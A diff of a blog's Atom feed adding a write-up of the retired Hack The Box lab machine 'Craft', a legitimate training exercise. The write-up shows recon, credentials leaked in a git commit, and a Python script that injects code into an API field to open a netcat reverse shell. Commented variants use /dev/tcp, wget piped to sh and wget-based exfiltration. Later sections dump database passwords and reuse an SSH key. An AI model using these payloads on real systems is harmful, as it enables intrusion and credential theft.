@@ -1,5 +1,381 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs - maggick</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/maggick.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2019-12-07T17:45:00+01:00</updated><entry><title>HTB: Wall</title><link href="https://maggick.fr/2019/12/htb-wall.html" rel="alternate"></link><published>2019-12-07T17:45:00+01:00</published><updated>2019-12-07T17:45:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2019-12-07:/2019/12/htb-wall.html</id><summary type="html">&lt;p&gt;&lt;img alt="Wall Card" class="align-left" src="/media/2019.12/wall_card.png" width="262"/&gt;&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs - maggick</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/maggick.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2020-01-05T10:35:00+01:00</updated><entry><title>HTB: Craft</title><link href="https://maggick.fr/2020/01/htb-craft.html" rel="alternate"></link><published>2020-01-05T10:35:00+01:00</published><updated>2020-01-05T10:35:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-01-05:/2020/01/htb-craft.html</id><summary type="html">&lt;p&gt;&lt;img alt="Craft card" class="align-left" src="/media/2020.01/craft_card.png" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;This is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/197"&gt;Craft&lt;/a&gt;
+This box is classified as a medium machine. The user part is quit long and
+involve to find "secrets" in a git repository, access an API to get a
+reverse shell and manipulate a MySQL database in a jailed environment. The root
+part is quit easier and involve to interact with a vault instance.&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.01/craft_card.png" alt="Craft card" width="262"&gt;&lt;/p&gt;
+&lt;p&gt;This is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/197"&gt;Craft&lt;/a&gt;
+This box is classified as a medium machine. The user part is quit long and
+involve to find "secrets" in a git repository, access an API to get a
+reverse shell and manipulate a MySQL database in a jailed environment. The root
+part is quit easier and involve to interact with a vault instance.&lt;/p&gt;
+
+
+&lt;div class="toc"&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="#user"&gt;User&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#recon"&gt;Recon&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#web"&gt;Web&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#gogs"&gt;GOGS&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#api-reverse-shell"&gt;API: reverse shell&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#mysql"&gt;MySQL&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#getting-root"&gt;getting root&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#enumeration"&gt;enumeration&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#vault"&gt;Vault&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#wrapping-up"&gt;Wrapping up&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt;
+&lt;h1 id="user"&gt;User&lt;/h1&gt;
+&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
+&lt;p&gt;We start with an nmap scan. Only the ports 22, 6022 (SSH) and 443 (HTTPS) are open.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;# Nmap 7.80 scan initiated Fri Nov  8 15:33:42 2019 as: nmap -p- -sSV -oA 10.10.10.110 10.10.10.110&lt;/span&gt;
+&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.110&lt;/span&gt;
+&lt;span class="code-line"&gt;Host is up (0.15s latency).&lt;/span&gt;
+&lt;span class="code-line"&gt;Not shown: 65532 closed ports&lt;/span&gt;
+&lt;span class="code-line"&gt;PORT     STATE SERVICE  VERSION&lt;/span&gt;
+&lt;span class="code-line"&gt;22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)&lt;/span&gt;
+&lt;span class="code-line"&gt;443/tcp  open  ssl/http nginx 1.15.8&lt;/span&gt;
+&lt;span class="code-line"&gt;6022/tcp open  ssh      (protocol 2.0)&lt;/span&gt;
+&lt;span class="code-line"&gt;1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :&lt;/span&gt;
+&lt;span class="code-line"&gt;SF-Port6022-TCP:V=7.80%I=7%D=11/8%Time=5DC57F7D%P=x86_64-pc-linux-gnu%r(NU&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:LL,C,&amp;quot;SSH-2\.0-Go\r\n&amp;quot;);&lt;/span&gt;
+&lt;span class="code-line"&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
+&lt;span class="code-line"&gt;# Nmap done at Fri Nov  8 15:45:26 2019 -- 1 IP address (1 host up) scanned in 704.14 seconds&lt;/span&gt;
+&lt;span class="code-line"&gt;# Web&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="web"&gt;Web&lt;/h2&gt;
+&lt;p&gt;The website present the Craft database for &lt;strong&gt;beers&lt;/strong&gt;!&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Craft aims to be the largest repository of US-produced craft brews accessible
+over REST. In the future we will release a mobile app to interface with our
+public rest API as well as a brew submission process, but for now, check out our API!&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;There is also a link to a &lt;a href="https://gogs.io/"&gt;gogs&lt;/a&gt; as well as the API. This
+links redirect to some subdomain. Let us add some informations in our
+&lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;cat /etc/hosts&lt;/span&gt;
+&lt;span class="code-line"&gt;127.0.0.1   localhost&lt;/span&gt;
+&lt;span class="code-line"&gt;127.0.1.1   kalili&lt;/span&gt;
+&lt;span class="code-line"&gt;10.10.10.110    craft.htb&lt;/span&gt;
+&lt;span class="code-line"&gt;10.10.10.110    api.craft.htb&lt;/span&gt;
+&lt;span class="code-line"&gt;10.10.10.110    gogs.craft.htb&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="gogs"&gt;GOGS&lt;/h2&gt;
+&lt;p&gt;On the gogs commit we can found the credentials of an user used for testing purpose in
+the commit &lt;code&gt;10e3ba4f0a09c778d7cec673f28d410b73455a86&lt;/code&gt; in the file
+&lt;code&gt;test/test.py&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="git file" src="/media/2020.01/craft_1.png"&gt;&lt;/p&gt;
+&lt;p&gt;This creds allow us to interct with the API. Moreover the &lt;code&gt;test.py&lt;/code&gt; script take
+care to generate a valid token and let us directly interact with the API. The
+quote are a bit a pain in the ass here. Nevertheless we can validate the code
+execution using a python simpleHTTPserver on our end and execute &lt;code&gt;wget 10.10.14.51:8081/$(&amp;lt;command&amp;gt;)&lt;/code&gt;
+server side.&lt;/p&gt;
+&lt;p&gt;At least we get a reverse shell.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;json&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;https://api.craft.htb/api/auth/login&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  &lt;span class="n"&gt;auth&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;dinesh&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;4aUh0A8PbVJxgd&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;verify&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;json_response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;loads&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;token&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  &lt;span class="n"&gt;json_response&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;token&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;headers&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;X-Craft-API-Token&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;token&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;application/json&amp;#39;&lt;/span&gt;  &lt;span class="p"&gt;}&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# make sure token is valid&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#response = requests.get(&amp;#39;https://api.craft.htb/api/auth/check&amp;#39;, headers=headers, verify=False, proxies=proxies)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;https://api.craft.htb/api/auth/check&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;verify&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# create a sample brew with bogus ABV... should fail.&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Create bogus ABV brew&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;brew_dict&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{}&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#brew_dict[&amp;#39;abv&amp;#39;] = &amp;#39;__import__(&amp;quot;os&amp;quot;).system(&amp;quot;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.51/7777 0&amp;gt;&amp;amp;1&amp;quot;)&amp;#39;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#brew_dict[&amp;#39;abv&amp;#39;] = &amp;#39;__import__(&amp;quot;os&amp;quot;).system(&amp;quot;wget 10.10.14.51:8081/$(ls ./lolll.sh)&amp;quot;)&amp;#39;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#brew_dict[&amp;#39;abv&amp;#39;] = &amp;#39;__import__(&amp;quot;os&amp;quot;).system(&amp;quot;ncat 10.10.14.51 4444 -e /bin/sh &amp;amp;&amp;quot;)&amp;#39;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#brew_dict[&amp;#39;abv&amp;#39;] = &amp;#39;__import__(&amp;quot;os&amp;quot;).system(&amp;quot;wget -O - 10.10.14.51:8081/shell.py | sh&amp;quot;)&amp;#39;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;brew_dict&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;abv&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__import__(&lt;/span&gt;&lt;span class="se"&gt;\&amp;#39;&lt;/span&gt;&lt;span class="s1"&gt;os&lt;/span&gt;&lt;span class="se"&gt;\&amp;#39;&lt;/span&gt;&lt;span class="s1"&gt;).popen(&lt;/span&gt;&lt;span class="se"&gt;\&amp;#39;&lt;/span&gt;&lt;span class="s1"&gt;nc 10.10.14.194 7777 -e /bin/sh&lt;/span&gt;&lt;span class="se"&gt;\&amp;#39;&lt;/span&gt;&lt;span class="s1"&gt;).read()&amp;#39;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#brew_dict[&amp;#39;abv&amp;#39;] = &amp;#39;0.15&amp;#39;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;brew_dict&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;bullshit&amp;#39;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;brew_dict&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;brewer&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;bullshit&amp;#39;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;brew_dict&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;style&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;bullshit&amp;#39;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;json_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dumps&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;brew_dict&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;json_data&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;https://api.craft.htb/api/brew/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;json_data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;verify&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="api-reverse-shell"&gt;API: reverse shell&lt;/h2&gt;
+&lt;p&gt;Once we get a relay on the box we notice that we are root… but in a docker.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;cat release_agent&lt;/span&gt;
+&lt;span class="code-line"&gt;/var/lib/docker/overlay2/28e271a4328612a47294bbae8c8b7f01470e29454eef499b5beda147a55000e0/diff/c&lt;/span&gt;
+&lt;span class="code-line"&gt;uname -a&lt;/span&gt;
+&lt;span class="code-line"&gt;Linux 5a3d243127f5 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 Linux&lt;/span&gt;
+&lt;span class="code-line"&gt;cat /proc/1/cgroup&lt;/span&gt;
+&lt;span class="code-line"&gt;10:pids:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c&lt;/span&gt;
+&lt;span class="code-line"&gt;9:memory:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c&lt;/span&gt;
+&lt;span class="code-line"&gt;8:blkio:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c&lt;/span&gt;
+&lt;span class="code-line"&gt;7:perf_event:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c&lt;/span&gt;
+&lt;span class="code-line"&gt;6:net_cls,net_prio:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c&lt;/span&gt;
+&lt;span class="code-line"&gt;5:freezer:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c&lt;/span&gt;
+&lt;span class="code-line"&gt;4:devices:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c&lt;/span&gt;
+&lt;span class="code-line"&gt;3:cpuset:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c&lt;/span&gt;
+&lt;span class="code-line"&gt;2:cpu,cpuacct:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c&lt;/span&gt;
+&lt;span class="code-line"&gt;1:name=systemd:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="mysql"&gt;MySQL&lt;/h2&gt;
+&lt;p&gt;We explorer the application folder and found some database settings.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;cat craft_api/settings.py&lt;/span&gt;
+&lt;span class="code-line"&gt;# Flask settings&lt;/span&gt;
+&lt;span class="code-line"&gt;FLASK_SERVER_NAME = &amp;#39;api.craft.htb&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;FLASK_DEBUG = False  # Do not use debug mode in production&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;# Flask-Restplus settings&lt;/span&gt;
+&lt;span class="code-line"&gt;RESTPLUS_SWAGGER_UI_DOC_EXPANSION = &amp;#39;list&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;RESTPLUS_VALIDATE = True&lt;/span&gt;
+&lt;span class="code-line"&gt;RESTPLUS_MASK_SWAGGER = False&lt;/span&gt;
+&lt;span class="code-line"&gt;RESTPLUS_ERROR_404_HELP = False&lt;/span&gt;
+&lt;span class="code-line"&gt;CRAFT_API_SECRET = &amp;#39;hz66OCkDtv8G6D&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;# database&lt;/span&gt;
+&lt;span class="code-line"&gt;MYSQL_DATABASE_USER = &amp;#39;craft&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;MYSQL_DATABASE_PASSWORD = &amp;#39;qLGockJ6G2J75O&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;MYSQL_DATABASE_DB = &amp;#39;craft&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;MYSQL_DATABASE_HOST = &amp;#39;db&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;SQLALCHEMY_TRACK_MODIFICATIONS = False&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;In order to have a "better" shell we can use &lt;code&gt;/bin/sh -i&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;There is a &lt;code&gt;dbtest.py&lt;/code&gt; script that allow us to test the connection to the
+database. We cat that script in a new one in order to change the SQL line to
+list the &lt;code&gt;users&lt;/code&gt;'s table. At first I tried with a &lt;code&gt;from users&lt;/code&gt;. As there was no
+result I tried with the following:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;/opt/app # head -n 15 dbtest.py &amp;gt; dbtest2.py&lt;/span&gt;
+&lt;span class="code-line"&gt;/opt/app # echo &amp;#39;        sql = &amp;quot;SELECT * from user&amp;quot;&amp;#39; &amp;gt;&amp;gt;dbtest2.py&lt;/span&gt;
+&lt;span class="code-line"&gt;/opt/app # echo &amp;#39;        sql = &amp;quot;SELECT * from user&amp;quot;&amp;#39; &amp;gt;&amp;gt;dbtest2.py&lt;/span&gt;
+&lt;span class="code-line"&gt;/opt/app # tail -n 6 dbtest.py &amp;gt;&amp;gt; dbtest2.py&lt;/span&gt;
+&lt;span class="code-line"&gt;/opt/app # python dbtest2.py&lt;/span&gt;
+&lt;span class="code-line"&gt;{&amp;#39;id&amp;#39;: 1, &amp;#39;username&amp;#39;: &amp;#39;dinesh&amp;#39;, &amp;#39;password&amp;#39;: &amp;#39;4aUh0A8PbVJxgd&amp;#39;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We get only one user because the &lt;code&gt;dbtest.py&lt;/code&gt; script use the &lt;code&gt;cursor.fetchone()&lt;/code&gt; function.
+The &lt;code&gt;pymysql&lt;/code&gt; &lt;a href="https://pymysql.readthedocs.io/en/latest/modules/cursors.html"&gt;documentation&lt;/a&gt;
+indicate that we want to use the &lt;code&gt;cursor.fetchall()&lt;/code&gt; function. We modify our
+"script":&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;/opt/app # head -n 15 dbtest.py &amp;gt; dbtest2.py&lt;/span&gt;
+&lt;span class="code-line"&gt;/opt/app # echo &amp;#39;        sql = &amp;quot;SELECT * from user&amp;quot;&amp;#39; &amp;gt;&amp;gt;dbtest2.py&lt;/span&gt;
+&lt;span class="code-line"&gt;/opt/app # echo &amp;#39;        cursor.execute(sql)&amp;#39;&amp;gt;&amp;gt;dbtest2.py&lt;/span&gt;
+&lt;span class="code-line"&gt;/opt/app # echo &amp;#39;        result = cursor.fetchall()&amp;#39;&amp;gt;&amp;gt;dbtest2.py&lt;/span&gt;
+&lt;span class="code-line"&gt;/opt/app # tail -n 4 dbtest.py &amp;gt;&amp;gt;dbtest2.py&lt;/span&gt;
+&lt;span class="code-line"&gt;/opt/app # python dbtest2.py&lt;/span&gt;
+&lt;span class="code-line"&gt;[{&amp;#39;id&amp;#39;: 1, &amp;#39;username&amp;#39;: &amp;#39;dinesh&amp;#39;, &amp;#39;password&amp;#39;: &amp;#39;4aUh0A8PbVJxgd&amp;#39;}, {&amp;#39;id&amp;#39;: 4, &amp;#39;username&amp;#39;: &amp;#39;ebachman&amp;#39;, &amp;#39;password&amp;#39;: &amp;#39;llJ77D8QFkLPQB&amp;#39;}, {&amp;#39;id&amp;#39;: 5, &amp;#39;username&amp;#39;: &amp;#39;gilfoyle&amp;#39;, &amp;#39;password&amp;#39;: &amp;#39;ZEU3N8WNM2rh4T&amp;#39;}]&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We can then connect to the GOGS with the &lt;code&gt;gilfoyle&lt;/code&gt; credentials.&lt;/p&gt;
+&lt;p&gt;This user has a private repository containing sensitive information as his private
+SSH key. The key is protected by a passphrase. That passhrase is his password!
+We need to copy his private and public key in our &lt;code&gt;.ssh&lt;/code&gt; folder. We also need to
+change the private key permission (&lt;code&gt;chmod 600&lt;/code&gt;). We can then SSH to the machine
+and get the user flag:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;ssh craft.htb -l gilfoyle&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  .   *   ..  . *  *&lt;/span&gt;
+&lt;span class="code-line"&gt;*  * @()Ooc()*   o  .&lt;/span&gt;
+&lt;span class="code-line"&gt;    (Q@*0CG*O()  ___&lt;/span&gt;
+&lt;span class="code-line"&gt;  |\_________/|/ _ \&lt;/span&gt;
+&lt;span class="code-line"&gt;  |  |  |  |  | / | |&lt;/span&gt;
+&lt;span class="code-line"&gt;  |  |  |  |  | | | |&lt;/span&gt;
+&lt;span class="code-line"&gt;  |  |  |  |  | | | |&lt;/span&gt;
+&lt;span class="code-line"&gt;  |  |  |  |  | | | |&lt;/span&gt;
+&lt;span class="code-line"&gt;  |  |  |  |  | | | |&lt;/span&gt;
+&lt;span class="code-line"&gt;  |  |  |  |  | \_| |&lt;/span&gt;
+&lt;span class="code-line"&gt;  |  |  |  |  |\___/&lt;/span&gt;
+&lt;span class="code-line"&gt;  |\_|__|__|_/|&lt;/span&gt;
+&lt;span class="code-line"&gt;    \_________/&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Enter passphrase for key &amp;#39;/root/.ssh/id_rsa&amp;#39;:&lt;/span&gt;
